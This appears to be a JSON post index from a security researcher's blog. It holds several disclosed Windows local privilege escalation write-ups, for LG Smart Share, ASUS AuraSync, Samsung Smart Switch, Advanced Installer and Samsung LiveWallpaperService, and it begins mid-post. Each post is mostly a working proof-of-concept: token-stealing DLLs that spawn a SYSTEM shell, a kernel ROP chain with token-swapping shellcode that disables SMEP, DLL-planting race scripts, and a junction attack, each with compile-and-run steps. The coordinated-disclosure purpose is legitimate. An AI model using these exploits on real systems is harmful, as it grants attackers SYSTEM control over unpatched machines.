lpStartupInfo = { 0 };\tPROCESS_INFORMATION lpProcessInformation = { 0 };\tlpStartupInfo.cb = sizeof(lpStartupInfo);\tNewProcess = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE, L\"C:\\\\Windows\\\\System32\\\\cmd.exe\", NULL, 0, NULL, NULL, &amp;lpStartupInfo, &amp;lpProcessInformation);\tif (!NewProcess) {\t\tprintf(\"[-] Failed to create a SYSTEM process\\n\");\t\treturn -1;\t}\tprintf(\"[+] Created a SYSTEM process\\n\");\tCloseHandle(NewToken);\tCloseHandle(hProcess);\tCloseHandle(TokenHandle);\treturn 0;}BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) { switch (fdwReason) { case DLL_PROCESS_ATTACH: {\t\t\texploit();\t\t\texit(-1); break; } case DLL_THREAD_ATTACH: { break; } case DLL_THREAD_DETACH: { break; } case DLL_PROCESS_DETACH: { break; } } return TRUE;} Use Visual Studio 2019 Compile the project in the DLL directory in x86 Release mode Rename the compiled dll to !.Dll and place it in the %USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps directory Run LG Smart Share Installer0x06: Affected ProductsThis vulnerability affects the following product: LG Smart Share Version ≤ 2.3.1712.12010x07: Credit informationHeeChan Kim (@heegong123) of TeamH4C0x08: TimeLine 2022/06/09 : First time contacted via LG Product Security. 2022/06/10 : I received a call from LG Product Security to analyze the vulnerability. 2022/06/28 : I recevied a file which is patched via LG Product Security. 2022/11/21 : The vulnerability has been patched, and CVE-2022-45422 (LVE-HOT-220005) has been issued.0x09: Reference https://lgsecurity.lge.com/bulletins/pc#updateDetails https://www.cve.org/CVERecord?id=CVE-2022-45422 https://nvd.nist.gov/vuln/detail/CVE-2022-45422" }, { "title": "CVE-2022-44898: ASUS AuraSync Kernel Stack Based Buffer Overflow Local Privilege Escalation", "url": "/posts/ASUS-AuraSync-Kernel-Stack-Based-Buffer-Overflow-Local-Privilege-Escalation/", "categories": "0-day", "tags": "Mitre, ASUS", "date": "2022-11-01 00:00:00 +0900", "snippet": "0x01: Details Title : CVE-2022-44898: ASUS AuraSync Kernel Stack Based Buffer Overflow Local Privilege Escalation CVE ID : CVE-2022-44898 Advisory Published: 2022/08/10 Advisory URL : https://www.asus.com/content/ASUS-Product-Security-Advisory/ Vender URL : https://www.asus.com/0x02: Test EnvironmentOS : windows 10 pro 64-bit 21H2 (build 19044.1826)ASUS AuraSync : 1.07.79_V2.20x03: Vulnerability detailsThe kernel driver MsIo64.sys is included in Asus AuraSync 1.07.79. A stack-based buffer overflow exists in this kernel driver IOCTL dispatch function.0x04: Technical descriptionWhen you download ASUS AURA SYNC software, MsIo64.sys driver is installed together. In the IOCTL code of this driver, the memmove function is called at 0x80102040, but there is no path check at this time, so a stack based buffer overflow vulnerability may occur.__int64 __fastcall sub_113F0(__int64 a1, IRP *a2) {\tULONG_PTR Src[2]; // [rsp+30h] [rbp-48h]\t...\tswitch ( LowPart )\t{\t\tcase 0x80102040:\t\t DbgPrint(\"IOCTL_MSIO_MAPPHYSTOLIN\");\t\t if ( !(_DWORD)Options )\t\t goto LABEL_9;\t\t memmove(Src, MasterIrp, Options);\t\t v11 = sub_FFFFF80375F91090((PHYSICAL_ADDRESS)Src[1], Src[0], &amp;BaseAddress, &amp;Handle, &amp;Object);\t\t if ( v11 &gt;= 0 )\t\t {\t\t memmove(MasterIrp, Src, Options);\t\t a2-&gt;IoStatus.Information = Options;\t\t }\t\t a2-&gt;IoStatus.Status = v11;\t\t break;\t...}MasterIrp is lpInBuffer as an argument when calling the DeviceIoControl function. Since lpInBuffer is moved to Src, and the length is not checked, a rop attack is possible by changing the dispatch function return address.0x05: Proof-of-Concept (PoC)#include &lt;stdio.h&gt;#include &lt;string&gt;#include &lt;Windows.h&gt;#include &lt;Psapi.h&gt;#define IOCTL_CODE 0x80102040BYTE shellcode_[] =\"\\x65\\x48\\x8B\\x14\\x25\\x88\\x01\\x00\\x00\" // mov rdx, gs:[188h] ; _ETHREAD\"\\x4C\\x8B\\x82\\x20\\x02\\x00\\x00\" // mov r8, [rdx + 220h] ; _EPROCESS\"\\x4D\\x8B\\x88\\x48\\x04\\x00\\x00\" // mov r9, [r8 + 448h] ; ActiveProcessLinks\"\\x49\\x8B\\x09\" // mov rcx, [r9] // GetProcessByPid\"\\x48\\x8B\\x51\\xF8\" // mov rdx, [rcx - 8] ; UniqueProcessId\"\\x48\\x83\\xFA\\x04\" // cmp rdx, 4 ; PID 4 SYSTEM process\"\\x74\\x05\" // jz found_system ; SYSTEM token\"\\x48\\x8B\\x09\" // mov rcx, [rcx] ; _LIST_ENTRY Flink\"\\xEB\\xF1\" // jmp find_system_proc ; While// FoundGetProcess\"\\x48\\x8B\\x41\\x70\" // mov rax, [rcx + 70h] ; Get Token\"\\x24\\xF0\" // and al, 0f0h // FindProcess\"\\x48\\x8B\\x51\\xF8\" // mov rdx, [rcx-8] ; UniqueProcessId\"\\x48\\x81\\xFA\\x00\\x00\\x00\\x00\" // cmp rdx, 0d54h ; if UniqueProcessId == CurrentPid\"\\x74\\x05\" // jz found_cmd ; True - jump FoundProcess\"\\x48\\x8B\\x09\" // mov rcx, [rcx] ; False - next entry\"\\xEB\\xEE\" // jmp find_cmd ; jump FindProcess// FoundProcess\"\\x48\\x89\\x41\\x70\" // mov [rcx+70h], rax ; Overwrite SYSTEM token\"\\x48\\x31\\xc0\" // xor rax rax \"\\x48\\x31\\xc9\" // xor rcx rcx \"\\x48\\x31\\xf6\" // xor rsi,rsi\"\\x48\\x31\\xff\" // xor rdi, rdi\"\\x4D\\x31\\xC0\" // xor r8, r8\"\\x48\\xc7\\xc1\\xf8\\x06\\x35\\x00\" // mov rcx, 0x3506f8 ; original cr4\"\\xc3\"; // retLPVOID GetBaseAddr(const char* drvname) { LPVOID drivers[1024]; DWORD cbNeeded; int nDrivers, i = 0; if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; sizeof(drivers)) { char szDrivers[1024]; nDrivers = cbNeeded / sizeof(drivers[0]); for (i = 0; i &lt; nDrivers; i++) { if (GetDeviceDriverBaseNameA(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) { if (strcmp(szDrivers, drvname) == 0) { return drivers[i]; } } } } return 0;}void exploit() { DWORD pid = GetCurrentProcessId(); INT64 ntoskrnl = (INT64)GetBaseAddr(\"ntoskrnl.exe\"); HANDLE hDevice; hDevice = CreateFileA(\"\\\\\\\\.\\\\MsIo\", FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice == INVALID_HANDLE_VALUE) { printf(\"[-] Error device open %d\\n\", GetLastError()); exit(1); } printf(\"[+] Success device open\\n\"); // Allocate executable memory BYTE* shellcode = (BYTE*)VirtualAlloc(NULL, sizeof(shellcode_), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(shellcode, shellcode_, sizeof(shellcode_)); memcpy(shellcode + 54, &amp;pid, sizeof(pid)); // Change the pid of the shellcode INT64 disable_SMEP = 0x250ef8; // cr4 value, disable SMEP INT64 enable_SMEP = 0x350ef8; // cr4 value, enable SMEP INT64 pop_rcx = ntoskrnl + 0x314f03; // pop rcx; ret INT64 mov_cr4 = ntoskrnl + 0x9a4217; // mov cr4, rcx; ret INT64 wbinvd = ntoskrnl + 0x37fb50; // wbinvd; ret INT64 ret = pop_rcx + 1; // ret printf(\"[+] SMEP disabled\\n\"); BYTE input[136] = { 0, }; memset(input, 0x90, 72); // dummy memcpy(input + 72, &amp;pop_rcx, 8); // pop rcx memcpy(input + 80, &amp;disable_SMEP, 8); // disable SMEP value memcpy(input + 88, &amp;mov_cr4, 8); // mov cr4, rcx memcpy(input + 96, &amp;wbinvd, 8); // wbinvd; ret memcpy(input + 104, &amp;shellcode, 8); // shellcode memcpy(input + 112, &amp;mov_cr4, 8); // mov cr4, rcx memcpy(input + 120, &amp;ret, 8); // restore rsp(stack) memcpy(input + 128, &amp;ret, 8); // restore rsp(stack) DWORD temp; if (!DeviceIoControl(hDevice, IOCTL_CODE, input, sizeof(input), NULL, 0, &amp;temp, NULL)) { printf(\"[-] Failed DeviceIoControl %d\\n\", GetLastError()); exit(1); } printf(\"[+] SMEP enabled\\n\"); printf(\"[+] Sucesss execute shellcode\\n\"); printf(\"[+] Success Get SYSTEM shell\\n\"); printf(\"\\n\\n\"); system(\"cmd\");}int main() { exploit(); return 0;} Use Visual Studio 2019 Compile with x64 release mode Execute the compiled file0x06: Affected ProductsThis vulnerability affects the following product: ASUS AuraSync ≤ 1.07.79_V2.20x07: Credit informationHeeChan Kim (@heegong123) of TeamH4C0x08: TimeLine 2022/07/28 : First contact via E-Mail (security@asus.com) to negotiate a security channel; 2022/08/01 : I received a call from Asus Security to analyze the vulnerability. 2022/08/09 : I was provided with a patched version of the vulnerability. 2022/09/18 : My name is inducted into the Asus Hall of Fame. 2022/10/11 : The latest version update notice has been posted in the ASUS Latest security updates. 2022/11/01 : Request a CVE id via MITRE. 2023/02/07 : Received a call from MITRE for CVE-2022-44898.0x09: Reference https://www.asus.com/campaign/aura/us/download.php https://www.asus.com/content/ASUS-Product-Security-Advisory/" }, { "title": "CVE-2022-39846: DLL hijacking vulnerability in Smart Switch PC", "url": "/posts/CVE-2022-39846-DLL-hijacking-vulnerability-in-Smart-Switch-PC/", "categories": "0-day", "tags": "Samsung, 0-day, CVE, CVE-2022-39846, EoP, LPE, PE, DLL hijacking, Mitre", "date": "2022-09-11 00:00:00 +0900", "snippet": "0x01: Details Title: DLL hijacking vulnerability in Smart Switch PC CVE ID: CVE-2022-39846 Vendor ID : SVE-2022-1841 Advisory Published: 2022/09/07 Advisory URL : https://security.samsungmobile.com/serviceWeb.smsb?year=2022&amp;month=9 Vendor URL : https://security.samsungmobile.com/ CVSS : 7.8 HIGH(CVSS Version 3.x)0x02: Test Environment Samsung Smart Switch for Windows : 4.3.22063_6 OS : Windows 10 Pro 64-bit 21H2 (build 19044.1826)0x03: Vulnerability detailsDLL hijacking vulnerability in Smart Switch PC prior to version 4.3.22083_3 allows attacker to execute arbitrary code.0x04: Technical descriptionThe Samsung Smart Switch installer operates with Administrator privileges. The program writes logs to the location C:\\Users\\%Username%\\AppData\\Local\\Temp\\SmartSwitchPC_Install.Log. The log format is as follows:[Smart Switch] [ TIME : 19:17:12 ] OnBegin(+)[Smart Switch] [ TIME : 19:17:12 ] C:\\Users\\%Username%\\AppData\\Local\\Temp\\{Random_GUID}\\[Smart Switch] [ TIME : 19:17:12 ][Smart Switch] [ TIME : 19:17:12 ] bIsWow64 TRUE[Smart Switch] [ TIME : 19:17:12 ] GetKies2InstallFileName(+)[Smart Switch] [ TIME : 19:17:12 ] Write Key :Software\\\\Samsung[Smart Switch] [ TIME : 19:17:12 ] Write KeyName :KIESSETUP....The second line of the log file contains the path to the directory where the dll files are to be loaded.Example: C:\\Users\\%Username%\\AppData\\Local\\Temp\\{Random_GUID}The Samsung Smart Switch installer loads MSSetupAddinDllLOC.dll from this directory. This dll file is loaded before the license agreement, sometimes after the license agreement, and is loaded multiple times. For this reason, the dll hijacking succeeds by looking for that Random_GUID in the log file and copying the dll to the C:\\Users\\%Username%\\AppData\\Local\\Temp\\{Random_GUID} directory. Since this dll is loaded with Administrator privileges, it can be elevated with SYSTEM privileges.Note: %Username% must be replaced with the account name of the user logged into Windows.0x05: Proof-of-Concept (PoC)# python 3.8.2import osimport shutilimport getpassUSER_NAME = getpass.getuser()LOG_FILE = f'C:\\\\Users\\\\{USER_NAME}\\\\AppData\\\\Local\\\\Temp\\\\SmartSwitchPC_Install.Log'DLL_NAME = 'MSSetupAddinDllLOC.dll'def checkLine(path : str, index : int) -&gt; str: with open(path, 'r', encoding='utf-8') as f: ls = f.readlines() if len(ls) &gt;= index: return ls[index-2] else: return ''if __name__ == '__main__': if os.path.exists(LOG_FILE): os.remove(LOG_FILE) while True: if os.path.exists(LOG_FILE) and (st := checkLine(LOG_FILE, 3)): print('[+] Found Log File') temp_path = st[st.rfind(']')+2:st.rfind('}')+1] dll_path = temp_path + '\\\\' + DLL_NAME shutil.copy(DLL_NAME, dll_path) print('[+] DLL Copy Success') breakpoc.py#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;Psapi.h&gt;#include &lt;Tlhelp32.h&gt;#include &lt;sddl.h&gt;#pragma comment (lib,\"advapi32.lib\")int exploit() {\tDWORD lpidProcess[2048], lpcbNeeded, cProcesses;\tEnumProcesses(lpidProcess, sizeof(lpidProcess), &amp;lpcbNeeded);\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\tPROCESSENTRY32 p32;\tp32.dwSize = sizeof(PROCESSENTRY32);\tint processWinlogonPid;\tif (Process32First(hSnapshot, &amp;p32)) {\t\tdo {\t\t\tif (wcscmp(p32.szExeFile, L\"winlogon.exe\") == 0) {\t\t\t\tprintf(\"[+] Located winlogon.exe by process name (PID %d)\\n\", p32.th32ProcessID);\t\t\t\tprocessWinlogonPid = p32.th32ProcessID;\t\t\t\tbreak;\t\t\t}\t\t} while (Process32Next(hSnapshot, &amp;p32));\t\tCloseHandle(hSnapshot);\t}\tLUID luid;\tHANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());\tif (currentProc) {\t\tHANDLE TokenHandle = NULL;\t\tBOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;TokenHandle);\t\tif (hProcessToken) {\t\t\tBOOL checkToken = LookupPrivilegeValue(NULL, L\"SeDebugPrivilege\", &amp;luid);\t\t\tif (!checkToken) {\t\t\t\tprintf(\"[+] Current process token already includes SeDebugPrivilege\\n\");\t\t\t}\t\t\telse {\t\t\t\tTOKEN_PRIVILEGES tokenPrivs;\t\t\t\ttokenPrivs.PrivilegeCount = 1;\t\t\t\ttokenPrivs.Privileges[0].Luid = luid;\t\t\t\ttokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\t\t\t\tBOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &amp;tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);\t\t\t\tif (adjustToken != 0) {\t\t\t\t\tprintf(\"[+] Added SeDebugPrivilege to the current process token\\n\");\t\t\t\t}\t\t\t}\t\t\tCloseHandle(TokenHandle);\t\t}\t}\tCloseHandle(currentProc);\tHANDLE hProcess = NULL;\tHANDLE TokenHandle = NULL;\tHANDLE NewToken = NULL;\tBOOL OpenToken;\tBOOL Impersonate;\tBOOL Duplicate;\thProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processWinlogonPid);\tif (!hProcess) {\t\tprintf(\"[-] Failed to obtain a HANDLE to the target PID\\n\");\t\treturn -1;\t}\tprintf(\"[+] Obtained a HANDLE to the target PID\\n\");\tOpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &amp;TokenHandle);\tif (!OpenToken) {\t\tprintf(\"[-] Failed to obtain a HANDLE to the target TOKEN %d\\n\", GetLastError());\t}\tprintf(\"[+] Obtained a HANDLE to the target TOKEN\\n\");\tImpersonate = ImpersonateLoggedOnUser(TokenHandle);\tif (!Impersonate) {\t\tprintf(\"[-] Failed to impersonate the TOKEN's user\\n\");\t\treturn -1;\t}\tprintf(\"[+] Impersonated the TOKEN's user\\n\");\tDuplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;NewToken);\tif (!Duplicate) {\t\tprintf(\"[-] Failed to duplicate the target TOKEN\\n\");\t\treturn -1;\t}\tprintf(\"[+] Duplicated the target TOKEN\\n\");\tBOOL NewProcess;\tSTARTUPINFO lpStartupInfo = { 0 };\tPROCESS_INFORMATION lpProcessInformation = { 0 };\tlpStartupInfo.cb = sizeof(lpStartupInfo);\tNewProcess = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE, L\"C:\\\\Windows\\\\System32\\\\cmd.exe\", NULL, 0, NULL, NULL, &amp;lpStartupInfo, &amp;lpProcessInformation);\tif (!NewProcess) {\t\tprintf(\"[-] Failed to create a SYSTEM process\\n\");\t\treturn -1;\t}\tprintf(\"[+] Created a SYSTEM process\\n\");\tCloseHandle(NewToken);\tCloseHandle(hProcess);\tCloseHandle(TokenHandle);\treturn 0;}BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) { switch (fdwReason) { case DLL_PROCESS_ATTACH: {\t\t\texploit();\t\t\texit(-1); break; } case DLL_THREAD_ATTACH: { break; } case DLL_THREAD_DETACH: { break; } case DLL_PROCESS_DETACH: { break; } } return TRUE;}main.c Use Visual Studio 2022. Compile the project in the DLL directory in x86 Release mode. Rename the compiled dll to MSSetupAddinDllLOC.dll and place it in the same directory as poc.py. Run poc.py with python 3.8.2 Run Samsung Smart Switch for Windows Installer0x06: Affected ProductsThis vulnerability affects the following product: Smart Switch PC &lt; 4.3.22083_30x07: TimeLine 2022/08/02 : First time contacted via Samsung Mobile Security. 2022/08/03 : I received a call from Samsung Mobile Security to analyze the vulnerability. 2022/08/17 : I received a call from Samsung Mobile Security to determine the vulnerability as moderate and proceed with the patch. 2022/09/07 : The vulnerability has been patched, and CVE-2022-39846 (SVE-2022-1841) has been issued.0x08: Reference https://security.samsungmobile.com/serviceWeb.smsb?year=2022&amp;month=9 https://www.cve.org/CVERecord?id=CVE-2022-39846 https://nvd.nist.gov/vuln/detail/CVE-2022-39846" }, { "title": "CVE-2022-4956: Advaned Installer Local Privilege Escalation Vulnerability", "url": "/posts/Advaned-Installer-Local-Privilege-Escalation-Vulnerability/", "categories": "0-day", "tags": "Mitre, advanced installer", "date": "2022-06-12 00:00:00 +0900", "snippet": "0x01: Details Title: Advanced Installer Local Privilege Escalation Vulnerability CVE ID: CVE-2022-4956 Advisory Published: 2022/08/01 Advisory URL: https://www.advancedinstaller.com/release-19.7.1.html#bugfixes Vendor URL : https://www.advancedinstaller.com0x02: Test Environment OS : Windows 10 Pro 64 bit 21H2 (build 19044.1826) Advanced Installer: 19.7 Proton VPN: 2.0.00x03: Vulnerability detailsA vulnerability existed in the Advanced Installer that loaded GdiPlus.dll, one of the WinSxS DLLs.0x04: Technical descriptionI found this vulnerability through Proton VPN, so I will describe it as Proton VPN.The Proton VPN installer runs with Administrator privileges and loads GdiPlus.dll from %INSTALLER_LOCATION%\\ProtonVPN_win_v2.0.0.exe.Local\\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.1706_none_d94bc52be10975a7. If the ProtonVPN_win_v2.0.0.exe.Local directory does not exist, load the dll from C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.1706_none_d94bc52be10975a7. At this time, the ProtonVPN_win_v2.0.0.exe.Local directory can be accessed by general users, so the attacker can load GdiPlus.dll with Administrator privileges and elevate it to SYSTEM privileges through a dll hijacking attack.I discovered this vulnerability through Process Monitor.0x05: Proof-of-Concept (PoC)#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;Psapi.h&gt;#include &lt;Tlhelp32.h&gt;#include &lt;sddl.h&gt;#pragma comment (lib,\"advapi32.lib\")int exploit() {\tDWORD lpidProcess[2048], lpcbNeeded, cProcesses;\tEnumProcesses(lpidProcess, sizeof(lpidProcess), &amp;lpcbNeeded);\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\tPROCESSENTRY32 p32;\tp32.dwSize = sizeof(PROCESSENTRY32);\tint processWinlogonPid;\tif (Process32First(hSnapshot, &amp;p32)) {\t\tdo {\t\t\tif (wcscmp(p32.szExeFile, L\"winlogon.exe\") == 0) {\t\t\t\tprintf(\"[+] Located winlogon.exe by process name (PID %d)\\n\", p32.th32ProcessID);\t\t\t\tprocessWinlogonPid = p32.th32ProcessID;\t\t\t\tbreak;\t\t\t}\t\t} while (Process32Next(hSnapshot, &amp;p32));\t\tCloseHandle(hSnapshot);\t}\tLUID luid;\tHANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());\tif (currentProc) {\t\tHANDLE TokenHandle = NULL;\t\tBOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;TokenHandle);\t\tif (hProcessToken) {\t\t\tBOOL checkToken = LookupPrivilegeValue(NULL, L\"SeDebugPrivilege\", &amp;luid);\t\t\tif (!checkToken) {\t\t\t\tprintf(\"[+] Current process token already includes SeDebugPrivilege\\n\");\t\t\t}\t\t\telse {\t\t\t\tTOKEN_PRIVILEGES tokenPrivs;\t\t\t\ttokenPrivs.PrivilegeCount = 1;\t\t\t\ttokenPrivs.Privileges[0].Luid = luid;\t\t\t\ttokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\t\t\t\tBOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &amp;tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);\t\t\t\tif (adjustToken != 0) {\t\t\t\t\tprintf(\"[+] Added SeDebugPrivilege to the current process token\\n\");\t\t\t\t}\t\t\t}\t\t\tCloseHandle(TokenHandle);\t\t}\t}\tCloseHandle(currentProc);\tHANDLE hProcess = NULL;\tHANDLE TokenHandle = NULL;\tHANDLE NewToken = NULL;\tBOOL OpenToken;\tBOOL Impersonate;\tBOOL Duplicate;\thProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processWinlogonPid);\tif (!hProcess) {\t\tprintf(\"[-] Failed to obtain a HANDLE to the target PID\\n\");\t\treturn -1;\t}\tprintf(\"[+] Obtained a HANDLE to the target PID\\n\");\tOpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &amp;TokenHandle);\tif (!OpenToken) {\t\tprintf(\"[-] Failed to obtain a HANDLE to the target TOKEN %d\\n\", GetLastError());\t}\tprintf(\"[+] Obtained a HANDLE to the target TOKEN\\n\");\tImpersonate = ImpersonateLoggedOnUser(TokenHandle);\tif (!Impersonate) {\t\tprintf(\"[-] Failed to impersonate the TOKEN's user\\n\");\t\treturn -1;\t}\tprintf(\"[+] Impersonated the TOKEN's user\\n\");\tDuplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;NewToken);\tif (!Duplicate) {\t\tprintf(\"[-] Failed to duplicate the target TOKEN\\n\");\t\treturn -1;\t}\tprintf(\"[+] Duplicated the target TOKEN\\n\");\tBOOL NewProcess;\tSTARTUPINFO lpStartupInfo = { 0 };\tPROCESS_INFORMATION lpProcessInformation = { 0 };\tlpStartupInfo.cb = sizeof(lpStartupInfo);\tNewProcess = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE, L\"C:\\\\Windows\\\\System32\\\\cmd.exe\", NULL, 0, NULL, NULL, &amp;lpStartupInfo, &amp;lpProcessInformation);\tif (!NewProcess) {\t\tprintf(\"[-] Failed to create a SYSTEM process\\n\");\t\treturn -1;\t}\tprintf(\"[+] Created a SYSTEM process\\n\");\tCloseHandle(NewToken);\tCloseHandle(hProcess);\tCloseHandle(TokenHandle);\treturn 0;}BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) { switch (fdwReason) { case DLL_PROCESS_ATTACH: {\t\t\t\t\t\texploit(); break; } case DLL_THREAD_ATTACH: { break; } case DLL_THREAD_DETACH: { break; } case DLL_PROCESS_DETACH: { break; } } return TRUE;} After compiling the above code in x86 mode, place it as %INSTALLER_LOCATION%\\%INSTALLER%.Local\\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.1706_none_d94bc52be10975a7\\GdiPlus.dll.0x06: Affected ProductsThis vulnerability affects the following product: Advanced Installer &lt;= 19.7 Proton VPN for Windows &lt;= 2.0.00x07: TimeLine 2022/06/12 : First time contacted via email from Proton VPN(security@protonmail.com). 2022/07/20 : Proton VPN said this was an Advanced Installer vulnerability and asked the Advanced Installer if they could share the POC. 2022/08/01 : Received confirmation that a patch is being released (v19.7.1). Advanced Installer gave me the Advanced Installer Architect license key as a token of appreciation. 2023/09/23 : I applied for a CVE to VulDB. 2023/09/29 : I received a message from VulDB informing me that a CVE(CVE-2022-4956) has been issued.0x08: Reference https://www.advancedinstaller.com/release-19.7.1.html#bugfixes https://nvd.nist.gov/vuln/detail/CVE-2022-4956" }, { "title": "CVE-2022-24924: Improper access control vulnerability in LiveWallpaperService", "url": "/posts/CVE-2022-24924-Improper-access-control-vulnerability-in-LiveWallpaperService/", "categories": "0-day", "tags": "Samsung, 0-day, CVE, CVE-2022-24924, EoP, LPE, PE", "date": "2021-11-30 00:00:00 +0900", "snippet": "Improper access control vulnerability in LiveWallpaperServiceWindows version tested: Windows 10 20H2 (Build 19042.1348) 64bitLive Wallpaper Version: 3.0.9.0 or earlierThere is a LiveWallpaperService that works by default in Samsung laptops, but there was a vulnerability that created the SYSTEM directory in a directory with SYSTEM privileges in the SYSTEM service.Live Wallpaper is usually installed by default on Samsung laptops, but it is also an app available from the Microsoft Store. The app can be run with User permission and communicates between the server and the client through Named PIPE IPC. At this time, the PIPE Server is operating with SYSTEM privileges and does not check which the clients are.The following is the operation process performed when the corresponding app is launched.Server is ‘33;’ Upon receiving the unicode string, it accesses the ‘C:\\Users{username}\\AppData\\Local\\Packages\\Sidia.LiveWallpaper_wkpx6gdq8qyz8’ folder and checks the existence of the LiveWallpaperData directory. A new file system directory is created in the directory with the name ‘LiveWallpaperData’.Named PIPE is used to communicate with each other between processes. Since there is no separate client inspection, the attacker can directly open it and send the desired data.First, after opening Named PIPE directly, create a directory junction to C:\\Windows\\System32 using symboliclink-testing-tools produced by james forshaw. It is created as a subdirectory of the System32 directory with privileges.Here is the PoC for that vulnerability.In order to perform PoC, the following conditions must be met: Basically, LiveWallpaperService must be running in Windows. The CreateMountPoint.exe executable file and DeleteMountPoint.exe executable file built using the symboliclink-testing-tools produced by james forshaw must exist in the same directory as the PoC.# python 3.7.2import osimport shutilimport timeimport getpassdef stringToWstring(st : str) -&gt; str: result = '' for i in st: result += i+'\\x00' return resultdef main(): # current user name username = getpass.getuser() # path settings path1 = f'C:\\\\Users\\\\{username}\\\\AppData\\\\Local\\\\Packages\\\\Sidia.LiveWallpaper_wkpx6gdq8qyz8' path2 = 'C:\\\\Windows\\\\System32' # delete directory if os.path.isdir(path1): shutil.rmtree(path1) # create directory junction command = f'CreateMountPoint.exe \"{path1}\" \"{path2}\"' os.system(command) # write data to named pipe with open('\\\\\\\\.\\\\pipe\\\\LiveWallpaperPipe', 'a') as f: f.write(stringToWstring('33;')) # IPC delay time time.sleep(2) # directory check if os.path.isdir(path2+'\\\\LiveWallpaperData'): print('[+] Success') else: print('[-] failed') # delete directory junction command = f'DeleteMountPoint.exe {path1}' os.system(command) shutil.rmtree(path1)if __name__=='__main__': main()References https://github.com/heegong/CVE/tree/main/CVE-2022-24924 https://www.cve.org/CVERecord?id=CVE-2022-24924 https://security.samsungmobile.com/serviceWeb.smsb?year=2022&amp;month=2" } ]
